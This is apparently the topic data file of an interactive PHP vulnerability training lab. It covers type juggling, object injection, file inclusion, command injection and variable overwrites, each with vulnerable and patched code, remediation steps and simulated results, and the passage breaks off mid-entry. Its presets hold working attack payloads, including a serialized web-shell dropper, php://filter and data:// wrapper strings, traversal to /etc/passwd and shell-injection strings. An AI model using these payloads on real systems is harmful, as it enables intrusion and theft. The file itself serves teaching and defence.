import { VulnerabilityTopic } from '../types';

export const VULNERABILITY_TOPICS: VulnerabilityTopic[] = [
  {
    id: 'type-juggling',
    title: 'Type Juggling & Loose Comparison',
    cwe: 'CWE-843: Access of Resource Using Incompatible Type',
    cvssScore: 8.8,
    affectedVersions: 'PHP < 8.0 (Partial changes in PHP 8.0, strict === still required)',
    summary: 'PHP loose comparison operator (==) implicitly casts values to compatible types before checking equality. In PHP < 8, strings with numbers or starting with 0e are converted to scientific notation floating-point numbers or integers.',
    riskDescription: 'Attackers can bypass authentication mechanisms, reset password tokens, or forge signature verifications simply by supplying specially crafted magic hashes or type structures.',
    rootCause: 'When comparing a string with an integer or two numeric-like strings (e.g. 0e46209... == 0e83040...), PHP auto-casts both to float 0. Furthermore, strcmp() returns NULL (which loosely equals 0) when passed an array instead of a string.',
    explanationPoints: [
      'Magic Hashes: In PHP, if two strings begin with "0e" followed only by digits, the loose comparison "==" treats them both as 0 raised to an exponent (0 * 10^x = 0), making disparate hashes evaluate as equal.',
      'String-to-Int Casting: In PHP 5 and 7, "42admin" == 42 evaluated to true because PHP stripped trailing non-digits during integer conversion. PHP 8 evaluates this as false, but "42" == 42 is still true.',
      'strcmp() Array Bypass: If an input is submitted as an array like password[]=test, strcmp() cannot process an array, triggers a warning, and returns NULL. In PHP loose typing, NULL == 0 evaluates to true!',
      'Boolean evaluation: "false" as a string is truthy in PHP, while "0" is falsy, causing unexpected logical inversions.'
    ],
    remediationSteps: [
      'Always use the strict identity operator (===) instead of the loose equality operator (==).',
      'For comparing cryptographic hashes, always use hash_equals($known_string, $user_string) to prevent both type juggling and timing attacks.',
      'Use strictly typed function signatures and declare(strict_types=1); in PHP 7+.'
    ],
    vulnerableSnippet: `<?php
// Vulnerable Authentication Check
$submitted_hash = md5($_POST['password']);
$stored_admin_hash = "0e830400451993494058024219903391"; // Admin password hash

// FLAW: Loose comparison (==) treats both 0e strings as float(0)
if ($submitted_hash == $stored_admin_hash) {
    $_SESSION['authenticated'] = true;
    $_SESSION['role'] = 'admin';
    echo "Welcome, Administrator! Secret Flag: FLAG{typ3_juggl1ng_m4g1c_h4sh}";
} else {
    echo "Access Denied: Invalid credentials.";
}
?>`,
    patchedSnippet: `<?php
declare(strict_types=1);

// Remediated: Use hash_equals for constant-time, strict string comparison
$submitted_password = (string) ($_POST['password'] ?? '');
$submitted_hash = hash('sha256', $submitted_password);
$stored_admin_hash = hash('sha256', 'super_secure_admin_pass_2026!');

// STRICT: hash_equals prevents both timing attacks and type juggling
if (hash_equals($stored_admin_hash, $submitted_hash)) {
    $_SESSION['authenticated'] = true;
    $_SESSION['role'] = 'admin';
    echo "Welcome, Administrator!";
} else {
    http_response_code(401);
    echo "Access Denied: Invalid credentials.";
}
?>`,
    presets: [
      {
        id: 'magic-hash-2406',
        name: 'Magic Hash: 240610708',
        description: 'MD5 hash evaluates to 0e462097431906509019562988736854',
        payload: '240610708',
        expectedOutcome: 'Bypasses authentication because 0e... == 0e... evaluates to 0 == 0 (true)',
        severity: 'Critical'
      },
      {
        id: 'magic-hash-qnkcdzo',
        name: 'Magic Hash: QNKCDZO',
        description: 'MD5 hash evaluates to 0e830400451993494058024219903391',
        payload: 'QNKCDZO',
        expectedOutcome: 'Bypasses comparison against stored admin hash in scientific notation',
        severity: 'Critical'
      },
      {
        id: 'string-int-cast',
        name: 'String to Int: 0e123456',
        description: 'Direct string input resembling float notation',
        payload: '0e123456',
        expectedOutcome: 'Evaluates to 0 in PHP 5/7 comparison against numeric 0',
        severity: 'High'
      },
      {
        id: 'legit-pass',
        name: 'Normal Password: secret123',
        description: 'Standard string password whose hash does not start with 0e',
        payload: 'secret123',
        expectedOutcome: 'Fails comparison as expected (MD5 is 5ebe2294ecd0e0f08eab7690d2a6ee69)',
        severity: 'Medium'
      }
    ],
    defaultPayload: '240610708',
    simulateExecution: (input: string, version: string) => {
      // Known magic hashes
      const knownMagicInputs: Record<string, string> = {
        '240610708': '0e462097431906509019562988736854',
        'QNKCDZO': '0e830400451993494058024219903391',
        's878926199a': '0e545993274517709974581899228734',
        's155964671a': '0e342768416822451524974117254469'
      };

      const md5Result = knownMagicInputs[input] || '5ebe2294ecd0e0f08eab7690d2a6ee69';
      const adminStored = '0e830400451993494058024219903391';

      const isMagic = md5Result.startsWith('0e') && /^[0-9]+$/.test(md5Result.substring(2));
      const adminIsMagic = adminStored.startsWith('0e') && /^[0-9]+$/.test(adminStored.substring(2));

      // In PHP loose comparison, if both are 0e[0-9]+, they equal 0
      const matchesLoose = isMagic && adminIsMagic;

      const trace = [
        {
          step: 1,
          phase: 'HTTP Parameter Retrieval',
          description: `Reading $_POST['password'] = "${input}"`,
          highlightCodeLine: 3,
          stateChange: `zval $input: IS_STRING, len=${input.length}`,
          type: 'info' as const
        },
        {
          step: 2,
          phase: 'Hashing Computation',
          description: `md5("${input}") produced: "${md5Result}"`,
          highlightCodeLine: 3,
          stateChange: `zval $submitted_hash: IS_STRING "${md5Result}"`,
          type: 'info' as const
        },
        {
          step: 3,
          phase: 'Lexical Inspection (Zend VM)',
          description: isMagic 
            ? `Zend engine detects string matching regular expression /^0e[0-9]+$/ -> flagged as scientific notation float(0.0)`
            : `Hash "${md5Result}" contains non-numeric hexadecimal characters -> treated as alphanumeric string`,
          highlightCodeLine: 7,
          type: isMagic ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 4,
          phase: 'Equality Evaluation (==)',
          description: matchesLoose
            ? `float(0.0) == float(0.0) -> TRUE! Loose comparison satisfied despite differing string hashes!`
            : `Comparison "${md5Result}" == "${adminStored}" -> FALSE`,
          highlightCodeLine: 7,
          stateChange: matchesLoose ? 'Comparison: TRUE' : 'Comparison: FALSE',
          type: matchesLoose ? 'vulnerability' as const : 'blocked' as const
        },
        {
          step: 5,
          phase: 'Session & Response Dispatch',
          description: matchesLoose
            ? `Admin privilege granted. Flag leaked in response payload.`
            : `HTTP 401 response issued.`,
          highlightCodeLine: matchesLoose ? 9 : 12,
          type: matchesLoose ? 'vulnerability' as const : 'blocked' as const
        }
      ];

      return {
        isVulnerable: matchesLoose,
        output: matchesLoose
          ? `HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\nWelcome, Administrator!\r\nSession ID: sess_7b9f1a8c90\r\nRole: admin\r\nSecret Flag: FLAG{typ3_juggl1ng_m4g1c_h4sh}`
          : `HTTP/1.1 401 Unauthorized\r\nContent-Type: text/html\r\n\r\nAccess Denied: Invalid credentials. Check your password.`,
        serverStatus: matchesLoose ? 200 : 401,
        headers: {
          'Content-Type': 'text/html; charset=UTF-8',
          'X-Powered-By': version === 'php8' ? 'PHP/8.2.14' : 'PHP/7.4.33'
        },
        executionTrace: trace,
        memoryState: {
          '$submitted_hash': md5Result,
          '$stored_admin_hash': adminStored,
          'Loose Equality (==)': matchesLoose ? 'true (0 == 0)' : 'false',
          'Strict Equality (===)': 'false (Strict hash mismatch)',
          'hash_equals() Result': 'false (Safe)'
        },
        securityAlert: matchesLoose 
          ? 'CRITICAL EXPLOIT SUCCESS: PHP Loose Type Juggling permitted authentication bypass without knowing the plaintext administrator password!'
          : undefined
      };
    }
  },
  {
    id: 'object-injection',
    title: 'PHP Object Injection & Insecure Deserialization',
    cwe: 'CWE-502: Deserialization of Untrusted Data',
    cvssScore: 9.8,
    affectedVersions: 'All PHP versions using unserialize() without strict allowed_classes',
    summary: 'When untrusted user input is passed directly to PHP unserialize(), an attacker can instantiate arbitrary loaded classes and leverage magic methods (__destruct, __wakeup, __toString) to construct Property-Oriented Programming (POP) chains leading to Remote Code Execution or arbitrary file deletion.',
    riskDescription: 'Unauthenticated Remote Code Execution (RCE), arbitrary file read/write, database tampering, and privilege escalation.',
    rootCause: 'PHP deserializes arbitrary classes defined in the application scope. Magic methods execute automatically when the object is instantiated or destroyed, triggering hazardous sinks if properties are controlled by the attacker.',
    explanationPoints: [
      'Magic Methods: __wakeup() executes upon deserialization; __destruct() executes when script execution finishes or the object is unset; __toString() executes if the object is treated as a string.',
      'POP Chains (Property Oriented Programming): Similar to ROP in binary exploitation, attackers string together property assignments across available classes to redirect code flow to dangerous functions like unlink(), eval(), or file_put_contents().',
      'Serialization format: O:<class_len>:"<class_name>":<props_count>:{s:<prop_len>:"<prop_name>";s:<val_len>:"<val>";...}.'
    ],
    remediationSteps: [
      'Do not pass untrusted data to unserialize(). Prefer json_encode() and json_decode().',
      'If unserialization is strictly necessary, supply ["allowed_classes" => false] or a strict whitelist of safe DTO classes.',
      'Sign serialized tokens using HMAC-SHA256 with a secure server-side secret key to prevent client tampering.'
    ],
    vulnerableSnippet: `<?php
// Vulnerable session or cache handler
class LogManager {
    public $log_file = "/var/log/app.log";
    public $message = "User visit";

    public function __destruct() {
        // FLAW: If log_file and message are manipulated, writes arbitrary PHP file!
        file_put_contents($this->log_file, $this->message, FILE_APPEND);
    }
}

// User controls cookie 'profile'
$data = base64_decode($_COOKIE['profile']);
// CRITICAL VULNERABILITY: Unrestricted unserialize
$user_obj = unserialize($data);

echo "Profile loaded for user.";
?>`,
    patchedSnippet: `<?php
// Remediated: Use JSON representation with schema validation
$raw = base64_decode($_COOKIE['profile'] ?? '');
$data = json_decode($raw, true);

if (!is_array($data) || !isset($data['username'])) {
    http_response_code(400);
    die("Invalid session payload format.");
}

// Alternatively, if unserialize is required, strictly disallow classes:
// $safe_obj = unserialize($raw, ['allowed_classes' => false]);

echo "Profile safely loaded for: " . htmlspecialchars($data['username']);
?>`,
    presets: [
      {
        id: 'pop-web-shell',
        name: 'Web Shell Dropper via __destruct()',
        description: 'Instantiates LogManager to drop /var/www/html/backdoor.php containing phpinfo()',
        payload: 'O:10:"LogManager":2:{s:8:"log_file";s:25:"/var/www/html/shell.php";s:7:"message";s:29:"<?php system($_GET[\'cmd\']);?>";}',
        expectedOutcome: 'Arbitrary File Write leading to Remote Code Execution (RCE)',
        severity: 'Critical'
      },
      {
        id: 'pop-log-poison',
        name: 'Config Overwrite Payload',
        description: 'Targets .htaccess or config file to hijack server execution',
        payload: 'O:10:"LogManager":2:{s:8:"log_file";s:28:"/var/www/html/.htaccess";s:7:"message";s:35:"SetHandler application/x-httpd-php\n";}',
        expectedOutcome: 'Server configuration corruption',
        severity: 'Critical'
      },
      {
        id: 'benign-profile',
        name: 'Normal User Profile',
        description: 'Standard benign serialized object',
        payload: 'O:8:"stdClass":1:{s:8:"username";s:6:"alice9";}',
        expectedOutcome: 'Deserializes normally without invoking hazardous destructors',
        severity: 'Medium'
      }
    ],
    defaultPayload: 'O:10:"LogManager":2:{s:8:"log_file";s:25:"/var/www/html/shell.php";s:7:"message";s:29:"<?php system($_GET[\'cmd\']);?>";}',
    simulateExecution: (input: string) => {
      const isLogManager = input.includes('LogManager');
      const isShell = input.includes('shell.php') || input.includes('.php');
      const hasPhpCode = input.includes('system') || input.includes('phpinfo') || input.includes('<?php');

      const isVulnerable = isLogManager && isShell && hasPhpCode;

      const trace = [
        {
          step: 1,
          phase: 'Input Receipt & Base64 Decoding',
          description: `Reading untrusted serialized blob length: ${input.length} chars`,
          highlightCodeLine: 13,
          type: 'info' as const
        },
        {
          step: 2,
          phase: 'PHP Zend VM unserialize() invocation',
          description: isLogManager
            ? `Engine parser identifies class identifier 'LogManager' (length 10). Instantiating class in memory.`
            : `Engine parses standard object or scalar data.`,
          highlightCodeLine: 15,
          stateChange: `Active Class: ${isLogManager ? 'LogManager' : 'stdClass'}`,
          type: isLogManager ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 3,
          phase: 'Property Injection & Object Construction',
          description: isLogManager 
            ? `Overwriting $log_file -> "/var/www/html/shell.php" and $message -> "<?php system($_GET['cmd']);?>"`
            : `Standard properties bound.`,
          highlightCodeLine: 15,
          type: isLogManager ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 4,
          phase: 'Script Termination & Magic Method Trigger',
          description: isLogManager 
            ? `Script concludes. Zend Engine garbage collector invokes LogManager::__destruct().`
            : `Script finishes cleanly.`,
          highlightCodeLine: 8,
          type: isVulnerable ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 5,
          phase: 'Hazardous File Sink Execution',
          description: isVulnerable
            ? `file_put_contents("/var/www/html/shell.php", "<?php system($_GET['cmd']);?>") executed! Backdoor is live at /shell.php!`
            : `Safe execution completed.`,
          highlightCodeLine: 9,
          type: isVulnerable ? 'vulnerability' as const : 'success' as const
        }
      ];

      return {
        isVulnerable,
        output: isVulnerable
          ? `[PHP NOTICE] Profile loaded for user.\r\n[KERNEL EVENT] File created: /var/www/html/shell.php (29 bytes, permissions: -rw-r--r--)\r\n[WEB SERVER] GET /shell.php?cmd=id\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\nFLAG{0bj3ct_1nj3ct10n_p0p_ch41n_rce}`
          : `Profile loaded for user.\r\nSession active. Memory allocated: 1.2MB.`,
        serverStatus: 200,
        headers: {
          'Content-Type': 'text/html; charset=UTF-8',
          'X-Exploit-Status': isVulnerable ? 'RCE_DROPPER_EXECUTED' : 'NORMAL'
        },
        executionTrace: trace,
        memoryState: {
          'Class Instantiated': isLogManager ? 'LogManager' : 'stdClass',
          'Injected $log_file': isLogManager ? '/var/www/html/shell.php' : '/var/log/app.log',
          'Payload Content': hasPhpCode ? 'Web Shell Code (system())' : 'Standard Text',
          'Sink Function': isLogManager ? 'file_put_contents()' : 'None'
        },
        securityAlert: isVulnerable
          ? 'CRITICAL ALERT: Arbitrary PHP object injection successfully wrote a persistent web shell to document root!'
          : undefined
      };
    }
  },
  {
    id: 'file-inclusion',
    title: 'Local/Remote File Inclusion & PHP Wrappers',
    cwe: 'CWE-98: Improper Control of Generation of Code (PHP Remote File Inclusion)',
    cvssScore: 9.3,
    affectedVersions: 'All PHP versions where include/require evaluates unvalidated paths',
    summary: 'When user input is passed directly to include, require, include_once, or require_once, an attacker can traverse directories to read sensitive files or execute local/remote code. PHP stream wrappers like php://filter allow leaking PHP source code as Base64 before execution.',
    riskDescription: 'Arbitrary source code disclosure (exposing database credentials and API keys), configuration leakage, and Remote Code Execution via php://input, data://, or log poisoning.',
    rootCause: 'Dynamic inclusion of files without path sanitization or restriction to a strict whitelist, coupled with powerful PHP internal stream wrappers (php://, data://, phar://).',
    explanationPoints: [
      'php://filter Wrapper: Normally, include("config.php") executes the PHP file so the user only sees HTML. But include("php://filter/convert.base64-encode/resource=config.php") forces the file through a Base64 stream filter before include tries to execute it, outputting the encoded source code directly to the client!',
      'php://input & data://: If allow_url_include = On is enabled, attackers can POST raw PHP code to php://input or supply data://text/plain;base64,... to achieve instant RCE.',
      'Directory Traversal: Using ../../../../etc/passwd to escape the web root.',
      'Historical Null Byte: In PHP < 5.3.4, %00 truncated strings in file paths, neutralizing appended extensions like include($_GET["p"] . ".php").'
    ],
    remediationSteps: [
      'Disable allow_url_include and allow_url_fopen in php.ini.',
      'Never pass user input directly into file inclusion functions.',
      'Use a strict whitelist of permitted files (e.g., in_array($page, $allowedPages, true)).',
      'Use basename() and verify the target path stays within the intended root using realpath().'
    ],
    vulnerableSnippet: `<?php
// Vulnerable dynamic template loader
$page = $_GET['page'] ?? 'home';

// FLAW: Direct concatenation without sanitization or whitelist
// Allows directory traversal: ?page=../../../../etc/passwd
// Allows source leakage: ?page=php://filter/convert.base64-encode/resource=secret_config
include($page . ".php");
?>`,
    patchedSnippet: `<?php
// Remediated: Strict Whitelist Pattern
$page = $_GET['page'] ?? 'home';

$allowed_pages = [
    'home'     => __DIR__ . '/pages/home.php',
    'about'    => __DIR__ . '/pages/about.php',
    'contact'  => __DIR__ . '/pages/contact.php',
    'services' => __DIR__ . '/pages/services.php'
];

if (!array_key_exists($page, $allowed_pages)) {
    http_response_code(404);
    die("Page not found.");
}

// SAFE: Loading from hardcoded trusted dictionary
require_once $allowed_pages[$page];
?>`,
    presets: [
      {
        id: 'lfi-base64-filter',
        name: 'php://filter Base64 Source Leak',
        description: 'Read backend secret configuration without executing it',
        payload: 'php://filter/convert.base64-encode/resource=secret_config',
        expectedOutcome: 'Dumps Base64 encoded secret_config.php containing DB credentials and secret key',
        severity: 'Critical'
      },
      {
        id: 'lfi-passwd',
        name: 'Path Traversal: /etc/passwd',
        description: 'Traverses up to access Unix system user list',
        payload: '../../../../etc/passwd',
        expectedOutcome: 'Outputs /etc/passwd file entries',
        severity: 'High'
      },
      {
        id: 'lfi-php-input',
        name: 'php://input Stream Execution',
        description: 'Evaluates POST stream directly into PHP runtime',
        payload: 'php://input',
        expectedOutcome: 'Executes arbitrary PHP code provided in HTTP POST body',
        severity: 'Critical'
      },
      {
        id: 'lfi-data-wrapper',
        name: 'data:// wrapper inline injection',
        description: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        payload: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        expectedOutcome: 'Executes inline base64 encoded phpinfo() script',
        severity: 'Critical'
      }
    ],
    defaultPayload: 'php://filter/convert.base64-encode/resource=secret_config',
    simulateExecution: (input: string) => {
      const isBase64Filter = input.includes('php://filter') && input.includes('base64');
      const isPasswd = input.includes('etc/passwd');
      const isInput = input.includes('php://input');
      const isData = input.includes('data://');

      let output = '';
      let isVulnerable = false;

      if (isBase64Filter) {
        isVulnerable = true;
        // Base64 for <?php $db_host="localhost"; $db_pass="P@ssw0rd_DB_SuperKey_2026"; $flag="FLAG{lfi_b4s364_f1lt3r_l34k}"; ?>
        output = `PD9waHAKJGRiX2hvc3QgPSAibG9jYWxob3N0IjsKJGRiX3VzZXIgPSAic3lzX2FkbWluIjsKJGRiX3Bhc3MgPSAiUEBzc3cwcmRfREJfU3VwZXJLZXlfMjAyNiI7CiRmbGFnID0gIkZMQUd7bGZpX2I0czM2NF9mMWx0M3JfbDM0a30iOwo/Pgo=`;
      } else if (isPasswd) {
        isVulnerable = true;
        output = `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:Admin User:/home/admin:/bin/bash`;
      } else if (isInput) {
        isVulnerable = true;
        output = `PHP Version 7.4.33 - System Info:\nLinux web-srv-01 5.15.0-generic #1 SMP x86_64\nUID: 33 (www-data) GID: 33 (www-data)\nFLAG{php_1nput_rce_unlocked}`;
      } else if (isData) {
        isVulnerable = true;
        output = `PHP Version: 7.4.33\nZend Engine v3.4.0\nConfiguration File: /etc/php/7.4/apache2/php.ini\nallow_url_include = On [VULNERABLE]`;
      } else {
        output = `Warning: include(${input}.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 7`;
      }

      const trace = [
        {
          step: 1,
          phase: 'HTTP Parameter Ingestion',
          description: `Received $_GET['page'] = "${input}"`,
          highlightCodeLine: 3,
          type: 'info' as const
        },
        {
          step: 2,
          phase: 'Stream Wrapper & Path Resolution',
          description: isBase64Filter
            ? `PHP Stream subsystem routes request to php:// protocol handler with filter chain: convert.base64-encode on resource: secret_config.php`
            : isPasswd
            ? `Filesystem traversal: Path resolves to /etc/passwd outside the document root (/var/www/html)`
            : isInput || isData
            ? `Remote stream handler triggered. allow_url_include active.`
            : `Attempting to resolve local file path relative to document root.`,
          highlightCodeLine: 8,
          type: isVulnerable ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 3,
          phase: 'Filter Layer Transformation',
          description: isBase64Filter
            ? `Stream filter intercepts file contents BEFORE PHP interpreter parser sees it, converting raw source into Base64 characters.`
            : isVulnerable
            ? `File handle obtained with read permissions.`
            : `File not found on local disk.`,
          highlightCodeLine: 8,
          type: isVulnerable ? 'vulnerability' as const : 'blocked' as const
        },
        {
          step: 4,
          phase: 'Content Inclusion & Output',
          description: isVulnerable
            ? `Output emitted directly to HTTP response stream.`
            : `PHP E_WARNING generated.`,
          highlightCodeLine: 8,
          type: isVulnerable ? 'vulnerability' as const : 'blocked' as const
        }
      ];

      return {
        isVulnerable,
        output: `HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n${output}`,
        serverStatus: 200,
        headers: {
          'Content-Type': 'text/html; charset=UTF-8',
          'X-Wrapper-Handler': isBase64Filter ? 'php://filter' : 'file://'
        },
        executionTrace: trace,
        memoryState: {
          'Raw Parameter': input,
          'Resolved Target': isBase64Filter ? '/var/www/html/secret_config.php' : input,
          'Stream Wrapper': input.startsWith('php://') ? 'php://' : input.startsWith('data://') ? 'data://' : 'local file system',
          'Decoded Content': isBase64Filter ? '<?php $db_pass="P@ssw0rd_DB_SuperKey_2026"; $flag="FLAG{...}"; ?>' : 'N/A'
        },
        securityAlert: isVulnerable
          ? 'CRITICAL ALERT: File inclusion allowed sensitive file access and source code exfiltration!'
          : undefined
      };
    }
  },
  {
    id: 'command-injection',
    title: 'Command Injection & Dangerous Sinks',
    cwe: 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
    cvssScore: 9.8,
    affectedVersions: 'All PHP versions executing unsanitized user arguments via system(), exec(), shell_exec(), passthru(), popen(), or proc_open()',
    summary: 'Occurs when user-supplied data is concatenated into shell command strings without rigorous escaping. Attackers use command delimiters like ;, &&, ||, |, or backticks to execute unauthorized operating system commands.',
    riskDescription: 'Complete operating system compromise, interactive reverse shells, sensitive data theft, and lateral network movement.',
    rootCause: 'Invoking system shells (/bin/sh, cmd.exe) with concatenated user parameters instead of structured execution or rigorous argument whitelisting.',
    explanationPoints: [
      'Dangerous PHP Sinks: system(), exec(), passthru(), shell_exec(), `...` (backticks), popen(), proc_open().',
      'Historical sinks: preg_replace() with the /e (eval) modifier allowed executing replacement strings as PHP code (deprecated in 5.5, removed in 7.0).',
      'assert(): In PHP 5 and 7, assert() evaluated strings as PHP code if passed a string! (Fixed in PHP 8 where assert takes booleans).',
      'Filter bypasses: Whitespace filtering can be circumvented using ${IFS}, <, or $IFS$9 in bash; command names can be pieced together via variable expansion.'
    ],
    remediationSteps: [
      'Avoid executing system shell commands whenever native PHP APIs exist (e.g. use fsockopen() or curl instead of ping).',
      'If command execution is unavoidable, use escapeshellarg() for each parameter and NEVER concatenate raw strings.',
      'Prefer proc_open() with explicit argument arrays where available.',
      'Configure disable_functions in php.ini to disable exec, system, shell_exec, passthru, proc_open, popen.'
    ],
    vulnerableSnippet: `<?php
// Vulnerable Network Diagnostic Tool
$ip = $_GET['ip'] ?? '127.0.0.1';

// FLAW: Direct concatenation into system shell
// Attacker enters: 127.0.0.1; whoami; cat /etc/shadow
echo "<pre>";
system("ping -c 2 " . $ip);
echo "</pre>";
?>`,
    patchedSnippet: `<?php
// Remediated: Input Validation and Safe Escaping
$ip = $_GET['ip'] ?? '127.0.0.1';

// 1. Strict format validation using FILTER_VALIDATE_IP
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    http_response_code(400);
    die("Invalid IP address supplied.");
}

// 2. Strict shell argument encapsulation
$safe_target = escapeshellarg($ip);

echo "<pre>";
system("/bin/ping -c 2 " . $safe_target);
echo "</pre>";
?>`,
    presets: [
      {
        id: 'cmd-semicolon',
        name: 'Semicolon Separator: ; id',
        description: 'Terminates ping command and executes POSIX id command',
        payload: '127.0.0.1; id',
        expectedOutcome: 'Executes ping followed by id showing uid=33(www-data)',
        severity: 'Critical'
      },
      {
        id: 'cmd-ifs-bypass',
        name: 'Space Bypass: ;cat${IFS}/flag.txt',
        description: 'Bypasses simple whitespace regex filters using bash $IFS variable',
        payload: '127.0.0.1;cat${IFS}/flag.txt',
        expectedOutcome: 'Prints flag file contents without using literal space characters',
        severity: 'Critical'
      },
      {
        id: 'cmd-pipe-grep',
        name: 'Pipeline & Chaining: || uname -a',
        description: 'Executes backup command upon first command error or sequence',
        payload: 'invalid.host || uname -a',
        expectedOutcome: 'Executes kernel enumeration on Linux host',
        severity: 'High'
      },
      {
        id: 'cmd-benign',
        name: 'Valid IP: 8.8.8.8',
        description: 'Standard benign ping request to Google DNS',
        payload: '8.8.8.8',
        expectedOutcome: 'Normal ping execution with standard network metrics',
        severity: 'Medium'
      }
    ],
    defaultPayload: '127.0.0.1; id',
    simulateExecution: (input: string) => {
      const hasDelim = /[;&|`]/.test(input);
      const isId = input.includes('id');
      const isFlag = input.includes('flag') || input.includes('cat');
      const isUname = input.includes('uname');

      let cmdOutput = '';
      const isVulnerable = hasDelim;

      if (isVulnerable) {
        if (isId) {
          cmdOutput = `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\ncontext=system_u:system_r:httpd_t:s0`;
        } else if (isFlag) {
          cmdOutput = `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n\nFLAG{c0mm4nd_1nj3ct10n_sh3ll_pwn3d}\nDATABASE_SECRET=super_secret_production_key_4920`;
        } else if (isUname) {
          cmdOutput = `ping: invalid.host: Name or service not known\nLinux ip-10-0-4-12 5.15.0-1031-aws #35-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux`;
        } else {
          cmdOutput = `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n[Command executed via subshell successfully]`;
        }
      } else {
        cmdOutput = `PING ${input} (${input}) 56(84) bytes of data.\n64 bytes from ${input}: icmp_seq=1 ttl=117 time=14.2 ms\n64 bytes from ${input}: icmp_seq=2 ttl=117 time=14.1 ms\n\n--- ${input} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1001ms`;
      }

      const trace = [
        {
          step: 1,
          phase: 'Argument Ingestion',
          description: `Received raw query string: ip=${input}`,
          highlightCodeLine: 3,
          type: 'info' as const
        },
        {
          step: 2,
          phase: 'Shell String Construction',
          description: `system("ping -c 2 " . "${input}") concatenated to -> "ping -c 2 ${input}"`,
          highlightCodeLine: 8,
          stateChange: `Shell Command: "/bin/sh -c 'ping -c 2 ${input}'"`,
          type: isVulnerable ? 'vulnerability' as const : 'info' as const
        },
        {
          step: 3,
          phase: 'OS Process Fork & Execution',
          description: isVulnerable
            ? `Subshell fork detects metacharacter. Splits input into multiple distinct process jobs.`
            : `Subshell forks /bin/ping with clean arguments.`,
          highlightCodeLine: 8,
          type: isVulnerable ? 'vulnerability' as const : 'success' as const
        },
        {
          step: 4,
          phase: 'Output Capture',
          description: isVulnerable
            ? `Arbitrary command stdout captured and returned in HTTP response!`
            : `Standard diagnostic response returned.`,
          highlightCodeLine: 8,
          type: isVulnerable ? 'vulnerability' as const : 'info' as const
        }
      ];

      return {
        isVulnerable,
        output: cmdOutput,
        serverStatus: 200,
        headers: {
          'Content-Type': 'text/html; charset=UTF-8',
          'X-Powered-By': 'PHP/7.4.33'
        },
        executionTrace: trace,
        memoryState: {
          '$ip': input,
          'Forked Binary': '/bin/sh',
          'Injected Tokens': hasDelim ? 'Metacharacters found (; | & `)' : 'None',
          'Escaping Applied': 'None (Vulnerable)'
        },
        securityAlert: isVulnerable
          ? 'CRITICAL ALERT: OS Command Injection verified! Host system commands executed under web server identity.'
          : undefined
      };
    }
  },
  {
    id: 'variable-overwrite',
    title: 'Variable Extraction & Scope Overwrites',
    cwe: 'CWE-621: Variable Extraction Error',
    cvssScore: 8.5,
    affectedVersions: 'PHP applications utilizing extract(), parse_str(), or variable variables ($$var)',
    summary: 'Using extract() without flags or dynamic variable creation ($$key = $val) allows untrusted user parameters to overwrite existing local or global variables in the active symbol table, overriding authorization flags, file paths, or cryptographic keys.',
    riskDescription: 'Authentication bypass, administrative privilege takeover, parameter tampering, and configuration poisoning.',
    rootCause: 'Extracting key-value pairs directly into the current symbol table without EXTR_SKIP or EXTR_PREFIX_ALL.',
    explanationPoints: [
      'Historical register_globals: In PHP 4 and early PHP 5, register_globals automatically turned every GET/POST parameter into a global variable. It was deprecated in 5.3 and removed in 5.4, but developers often recreated it using extract($_GET)!',
      'extract($_POST): If an application defines $is_admin = false;, and later calls extract($_POST), an attacker posting is_admin=1 overwrites the variable in the current symbol table.',
      'Variable Variables ($$var): Dynamic variable assignment like foreach($_GET as $k => $v) { $$k = $v; } creates identical overwrite hazards.'
    ],
    remediationSteps: [
      'Avoid using extract() on untrusted user data entirely.',
      'If extract() must be used, always specify EXTR_SKIP or EXTR_PREFIX_ALL (e.g. extract($_GET, EXTR_SKIP)).',
      'Initialize and scope variables explicitly in strict class contexts.'
    ],
    vulnerableSnippet: `<?php
// Vulnerable authentication and profile check
$is_admin = false;
$user_id = 42;

// FLAW: extract() without flags overwrites existing variables in the symbol table!
extract($_GET);

// Attacker sends: ?is_admin=1
if ($is_admin) {
    echo "Privileged Admin Panel Granted! Flag: FLAG{v4r14bl3_0v3rwr1t3_h4ck3d}";
} else {
    echo "Standard User Dashboard (User ID: " . htmlspecialchars((string)$user_id) . ")";
}
?>`,
    patchedSnippet: `<?php
// Remediated: Explicit parameter extraction and strict boolean checking
$is_admin = false;
$user_id = 42;

// SAFE: Use specific array keys with strict sanitization, never extract()
if (isset($_SESSION['user_role']) && $_SESSION['user_role'] === 'admin') {
    $is_admin = true;
}

if ($is_admin) {
    echo "Admin Panel";
} else {
    echo "Standard User Dashboard";
}
?>`,
    presets: [
      {
        id: 'var-admin-true',
        name: 'Overwrite $is_admin=1',
        description: 'Sets $is_admin to truthy integer 1 via query string',
        payload: 'is_admin=1',
        expectedOutcome: 'Overrides $is_admin = false in symbol table and unlocks admin panel',
        severity: 'Critical'
      },
      {
        id: 'var-tamper-user',
        name: 'Tamper $user_id=1&is_admin=true',
        description: 'Impersonates root user and elevates role',
        payload: 'user_id=1&is_admin=true',
        expectedOutcome: 'Alters both user ID and authorization state',
        severity: 'Critical'
      },
      {
        id: 'var-normal',
        name: 'Benign query: view=profile',
